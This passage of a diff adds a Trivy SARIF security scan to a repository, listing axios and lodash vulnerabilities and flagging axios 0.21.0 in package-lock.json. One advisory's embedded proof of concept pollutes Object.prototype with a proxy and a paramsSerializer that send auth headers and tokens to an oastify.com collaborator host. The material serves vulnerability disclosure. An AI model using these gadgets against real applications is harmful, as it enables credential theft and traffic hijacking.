`Object.prototype` to hijack outbound requests.\n\n### Details\n\nThe [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:\n\n`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.\n\n`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.\n\n`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.\n\nI read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.\n\n### PoC\n\nRan against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.\n\n```javascript\nimport axios from 'axios';\n\n// gadget 1 - proxy\nObject.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };\nawait axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });\n// check collaborator - request arrives with full path + auth header\n```\n\n```javascript\n// gadget 2 - data on bodyless methods\nObject.prototype.data = '{\"injected\":true}';\nawait axios.get('https://api.example.com/items');\nawait axios.delete('https://api.example.com/items/1');\nawait axios.head('https://api.example.com/items');\n// 3/4 methods send the polluted body\n```\n\n```javascript\n// gadget 3 - paramsSerializer\nObject.prototype.paramsSerializer = (p) => {\n  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));\n  return 'q=x';\n};\nawait axios.get('https://api.example.com/search', { params: { token: 'secret' } });\n```\n\n### Impact\n\nAny app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.\n</details>",
+                "markdown": "**Vulnerability GHSA-mmx7-hfxf-jppx**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.18.0, 0.33.0|[GHSA-mmx7-hfxf-jppx](https://github.com/advisories/GHSA-mmx7-hfxf-jppx)|\n\n## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.\n\nFor direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.\n\n## Affected Functionality\n\nAffected normal API:\n\n- `axios.get(url[, config])`\n- `axios.delete(url[, config])`\n- `axios.head(url[, config])`\n- `axios.options(url[, config])`\n\nAffected low-level usage:\n\n- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.\n- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.\n\nUnaffected or corrected scope:\n\n- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.\n\n## Technical Details\n\n`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.\n\n`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.\n\nThe low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    res.writeHead(200, {'content-type': 'application/json'});\n    res.end(JSON.stringify({body, headers: req.headers}));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.data = 'INJECTED';\n\ntry {\n  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);\n\n  console.log(res.data.body); // \"INJECTED\"\n  console.log(res.data.headers['content-length']); // \"8\"\n} finally {\n  delete Object.prototype.data;\n  await new Promise(resolve => server.close(resolve));\n}\n```\n\nExpected result: a request body is sent even though the caller did not explicitly set `config.data`.\n\n## Workarounds\n\nAvoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nThree prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted `Object.prototype` to hijack outbound requests.\n\n### Details\n\nThe [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:\n\n`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.\n\n`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.\n\n`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.\n\nI read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.\n\n### PoC\n\nRan against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.\n\n```javascript\nimport axios from 'axios';\n\n// gadget 1 - proxy\nObject.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };\nawait axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });\n// check collaborator - request arrives with full path + auth header\n```\n\n```javascript\n// gadget 2 - data on bodyless methods\nObject.prototype.data = '{\"injected\":true}';\nawait axios.get('https://api.example.com/items');\nawait axios.delete('https://api.example.com/items/1');\nawait axios.head('https://api.example.com/items');\n// 3/4 methods send the polluted body\n```\n\n```javascript\n// gadget 3 - paramsSerializer\nObject.prototype.paramsSerializer = (p) => {\n  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));\n  return 'q=x';\n};\nawait axios.get('https://api.example.com/search', { params: { token: 'secret' } });\n```\n\n### Impact\n\nAny app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.\n</details>"
+              },
+              "properties": {
+                "cvssv40_baseScore": 6.3,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "5.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42040",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Incorrect null byte handling can lead to data integrity issues"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the encode() function in lib/helpers/AxiosURLSearchParams.js contains a character mapping (charMap) at line 21 that reverses the safe percent-encoding of null bytes. After encodeURIComponent('\\x00') correctly produces the safe sequence %00, the charMap entry '%00': '\\x00' converts it back to a raw null byte. Primary impact is limited because the standard axios request flow is not affected. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42040",
+              "help": {
+                "text": "Vulnerability CVE-2026-42040\nSeverity: LOW\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42040](https://avd.aquasec.com/nvd/cve-2026-42040)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the encode() function in lib/helpers/AxiosURLSearchParams.js contains a character mapping (charMap) at line 21 that reverses the safe percent-encoding of null bytes. After encodeURIComponent('\\x00') correctly produces the safe sequence %00, the charMap entry '%00': '\\x00' converts it back to a raw null byte. Primary impact is limited because the standard axios request flow is not affected. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42040**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|LOW|axios|1.15.1, 0.31.1|[CVE-2026-42040](https://avd.aquasec.com/nvd/cve-2026-42040)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, the encode() function in lib/helpers/AxiosURLSearchParams.js contains a character mapping (charMap) at line 21 that reverses the safe percent-encoding of null bytes. After encodeURIComponent('\\x00') correctly produces the safe sequence %00, the charMap entry '%00': '\\x00' converts it back to a raw null byte. Primary impact is limited because the standard axios request flow is not affected. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 3.7,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                "precision": "very-high",
+                "security-severity": "3.7",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2020-8203",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "nodejs-lodash: prototype pollution in zipObjectDeep function"
+              },
+              "fullDescription": {
+                "text": "Prototype pollution attack when using _.zipObjectDeep in lodash before 4.17.20."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2020-8203",
+              "help": {
+                "text": "Vulnerability CVE-2020-8203\nSeverity: HIGH\nPackage: lodash\nFixed Version: 4.17.19\nLink: [CVE-2020-8203](https://avd.aquasec.com/nvd/cve-2020-8203)\nPrototype pollution attack when using _.zipObjectDeep in lodash before 4.17.20.",
+                "markdown": "**Vulnerability CVE-2020-8203**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|lodash|4.17.19|[CVE-2020-8203](https://avd.aquasec.com/nvd/cve-2020-8203)|\n\nPrototype pollution attack when using _.zipObjectDeep in lodash before 4.17.20."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2021-23337",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "nodejs-lodash: command injection via template"
+              },
+              "fullDescription": {
+                "text": "Lodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2021-23337",
+              "help": {
+                "text": "Vulnerability CVE-2021-23337\nSeverity: HIGH\nPackage: lodash\nFixed Version: 4.17.21\nLink: [CVE-2021-23337](https://avd.aquasec.com/nvd/cve-2021-23337)\nLodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+                "markdown": "**Vulnerability CVE-2021-23337**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|lodash|4.17.21|[CVE-2021-23337](https://avd.aquasec.com/nvd/cve-2021-23337)|\n\nLodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.2,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+                "precision": "very-high",
+                "security-severity": "7.2",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-4800",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "lodash: lodash: Arbitrary code execution via untrusted input in template imports"
+              },
+              "fullDescription": {
+                "text": "Impact:\n\nThe fix for CVE-2021-23337 (https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink.\n\nWhen an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in. If Object.prototype has been polluted by any other vector, the polluted keys are copied into the imports object and passed to Function().\n\nPatches:\n\nUsers should upgrade to version 4.18.0.\n\nWorkarounds:\n\nDo not pass untrusted input as key names in options.imports. Only use developer-controlled, static key names."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-4800",
+              "help": {
+                "text": "Vulnerability CVE-2026-4800\nSeverity: HIGH\nPackage: lodash\nFixed Version: 4.18.0\nLink: [CVE-2026-4800](https://avd.aquasec.com/nvd/cve-2026-4800)\nImpact:\n\nThe fix for CVE-2021-23337 (https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink.\n\nWhen an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in. If Object.prototype has been polluted by any other vector, the polluted keys are copied into the imports object and passed to Function().\n\nPatches:\n\nUsers should upgrade to version 4.18.0.\n\nWorkarounds:\n\nDo not pass untrusted input as key names in options.imports. Only use developer-controlled, static key names.",
+                "markdown": "**Vulnerability CVE-2026-4800**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|lodash|4.18.0|[CVE-2026-4800](https://avd.aquasec.com/nvd/cve-2026-4800)|\n\nImpact:\n\nThe fix for CVE-2021-23337 (https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink.\n\nWhen an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in. If Object.prototype has been polluted by any other vector, the polluted keys are copied into the imports object and passed to Function().\n\nPatches:\n\nUsers should upgrade to version 4.18.0.\n\nWorkarounds:\n\nDo not pass untrusted input as key names in options.imports. Only use developer-controlled, static key names."
+              },
+              "properties": {
+                "cvssv3_baseScore": 8.1,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "precision": "very-high",
+                "security-severity": "8.1",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "NSWG-ECO-516",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Allocation of Resources Without Limits or Throttling"
+              },
+              "fullDescription": {
+                "text": "Prototype pollution attack (lodash)"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://www.npmjs.com/advisories/1523",
+              "help": {
+                "text": "Vulnerability NSWG-ECO-516\nSeverity: HIGH\nPackage: lodash\nFixed Version: >=4.17.19\nLink: [NSWG-ECO-516](https://www.npmjs.com/advisories/1523)\nPrototype pollution attack (lodash)",
+                "markdown": "**Vulnerability NSWG-ECO-516**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|lodash|>=4.17.19|[NSWG-ECO-516](https://www.npmjs.com/advisories/1523)|\n\nPrototype pollution attack (lodash)"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2020-28500",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "nodejs-lodash: ReDoS via the toNumber, trim and trimEnd functions"
+              },
+              "fullDescription": {
+                "text": "Lodash versions prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2020-28500",
+              "help": {
+                "text": "Vulnerability CVE-2020-28500\nSeverity: MEDIUM\nPackage: lodash\nFixed Version: 4.17.21\nLink: [CVE-2020-28500](https://avd.aquasec.com/nvd/cve-2020-28500)\nLodash versions prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions.",
+                "markdown": "**Vulnerability CVE-2020-28500**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|lodash|4.17.21|[CVE-2020-28500](https://avd.aquasec.com/nvd/cve-2020-28500)|\n\nLodash versions prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.3,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-13465",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "lodash: prototype pollution in _.unset and _.omit functions"
+              },
+              "fullDescription": {
+                "text": "Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\nThis issue is patched on 4.17.23"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-13465",
+              "help": {
+                "text": "Vulnerability CVE-2025-13465\nSeverity: MEDIUM\nPackage: lodash\nFixed Version: 4.17.23\nLink: [CVE-2025-13465](https://avd.aquasec.com/nvd/cve-2025-13465)\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\nThis issue is patched on 4.17.23",
+                "markdown": "**Vulnerability CVE-2025-13465**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|lodash|4.17.23|[CVE-2025-13465](https://avd.aquasec.com/nvd/cve-2025-13465)|\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the _.unset and _.omit functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.\n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.\n\nThis issue is patched on 4.17.23"
+              },
+              "properties": {
+                "cvssv3_baseScore": 6.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+                "cvssv40_baseScore": 6.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:H/SI:H/SA:H/E:P",
+                "precision": "very-high",
+                "security-severity": "6.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-2950",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "lodash: Lodash: Prototype pollution allows deletion of built-in prototype properties via array path bypass"
+              },
+              "fullDescription": {
+                "text": "Impact:\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\nPatches:\n\nThis issue is patched in 4.18.0.\n\nWorkarounds:\n\nNone. Upgrade to the patched version."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-2950",
+              "help": {
+                "text": "Vulnerability CVE-2026-2950\nSeverity: MEDIUM\nPackage: lodash\nFixed Version: 4.18.0\nLink: [CVE-2026-2950](https://avd.aquasec.com/nvd/cve-2026-2950)\nImpact:\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\nPatches:\n\nThis issue is patched in 4.18.0.\n\nWorkarounds:\n\nNone. Upgrade to the patched version.",
+                "markdown": "**Vulnerability CVE-2026-2950**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|lodash|4.18.0|[CVE-2026-2950](https://avd.aquasec.com/nvd/cve-2026-2950)|\n\nImpact:\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\nPatches:\n\nThis issue is patched in 4.18.0.\n\nWorkarounds:\n\nNone. Upgrade to the patched version."
+              },
+              "properties": {
+                "cvssv3_baseScore": 6.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+                "precision": "very-high",
+                "security-severity": "6.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            }
+          ],
+          "version": "0.73.0"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2021-3749",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2021-3749\nSeverity: HIGH\nFixed Version: 0.21.2\nLink: [CVE-2021-3749](https://avd.aquasec.com/nvd/cve-2021-3749)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-27152",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2025-27152\nSeverity: HIGH\nFixed Version: 1.8.2, 0.30.0\nLink: [CVE-2025-27152](https://avd.aquasec.com/nvd/cve-2025-27152)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-25639",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-25639\nSeverity: HIGH\nFixed Version: 1.13.5, 0.30.3\nLink: [CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42033",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42033\nSeverity: HIGH\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42033](https://avd.aquasec.com/nvd/cve-2026-42033)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42035",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42035\nSeverity: HIGH\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42035](https://avd.aquasec.com/nvd/cve-2026-42035)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-42043",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-42043\nSeverity: HIGH\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42043](https://avd.aquasec.com/nvd/cve-2026-42043)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44486",
+          "level": "error",
+          "message": {
+            "text": "Package: axios\nInstalled Version: 0.21.0\nVulnerability CVE-2026-44486\nSeverity: HIGH\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44486](https://avd.aquasec.com/nvd/cve-2026-44486)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package-lock.json",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 162,
+                  "startColumn": 1,
+                  "endLine": 171,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "package-lock.json: axios@0.21.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44487",
+          "level": "error",
+          "message": {
